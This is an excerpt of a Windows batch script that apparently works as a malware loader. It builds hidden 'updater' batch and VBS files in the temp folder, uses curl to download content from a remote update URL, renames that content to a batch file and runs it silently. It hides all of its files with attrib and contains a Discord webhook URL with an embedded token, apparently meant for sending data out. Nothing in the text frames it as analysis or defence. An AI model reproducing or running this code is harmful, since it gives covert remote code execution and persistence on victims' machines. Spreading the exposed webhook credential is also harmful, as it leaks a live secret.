...
:: --------------------------------------
set "webhook=https://discord.com/api/webhooks/1323592018949312512/ZfTvQB4zpSucU7kN30T62emjvj8jtHD2L0RD-5c31cNTTCs-T2t15L31bE7QWB28lDlS"
...
:: TARGET USERNAME IS NOT SET, UPDATING ON EVERY COMPUTER
	...
	echo start %temp%>> "%vpath%\%uname%"
	echo timeout 1 ^>nul>> "%vpath%\%uname%"
	echo break^>%temp%>> "%vpath%\%uname%"
	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo ^>NUL attrib "%temp%\%vname%" +h>> "%vpath%\%uname%"
	echo ^>NUL attrib "%temp%\%bname%" +h>> "%vpath%\%uname%"
	echo ^>NUL attrib "%temp%\%uname%" +h>> "%vpath%\%uname%"
...
IF "%USERNAME%"=="%targetusername%" (
	...
	:: Make updater batch
	echo ^@echo off> "%temp%\%uname%"
	echo cd "%temp%">> "%tem%\%uname%"
	echo IF EXIST "%temp%\temp.txt" 2^>NUL del "%temp%\temp.txt">> "%temp%\%uname%"
	echo ^>NUL attrib -h %bname%>> "%temp%\%uname%"
	echo ^>NUL attrib -h %uname%>> "%temp%\%uname%"
	echo ^>NUL attrib -h %vname%>> "%temp%\%uname%"
	echo curl --silent --output /dev/null -sb --trace-ascii "Accept: text/plain" %updateurl% ^> "%vpath%\temp.txt">> "%vpath%\%uname%"
	echo :wl>> "%temp%\%uname%"
	echo IF EXIST "%temp%\temp.txt" GOTO w2>> "%temp%\%uname%"
	echo timeout /t 1 >> "%temp%\%uname%"
	echo goto wl>> "%temp%\%uname%"
	echo :w2>> "%temp%\%uname%"
	echo 2^>NUL del %bname%>> "%temp%\%uname%"
	echo ren temp.txt %bname%>> "%temp%\%uname%"
	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%temp%\%uname%"
	echo break^>%vname%>> "%temp%\%uname%"
	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%temp%\%vname%">> "%temp%\%uname%"
	echo echo WshShell^.run """%temp%\%bname%"" ", 0, true^>^> "%temp%\%vname%">> "%temp%\%uname%"
	echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%temp%\%uname%"
	echo start %vname%>> "%temp%\%uname%"
	echo timeout 1 ^>nul>> "%temp%\%uname%"
	echo break^>%vname%>> "%temp%\%uname%"
	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%temp%\%vname%">> "%temp%\%uname%"
	echo echo WshShell^.run """%temp%\%uname%"" ", 0, true^>^> "%temp%\%vname%">> "%temp%\%uname%"
	echo echo set WshShell = Nothing^>^> "%temp%\%vname%">> "%temp%\%uname%"
	echo ^>NUL attrib "%temp%\%vanme%" +h>> "%temp%\%uname%"
	echo ^>NUL attrib "%temp%\%bname%" +h>> "%temp%\%uname%"
	echo ^>NUL attrib "%temp%\%uname%" +h>> "%temp%\%uname%"
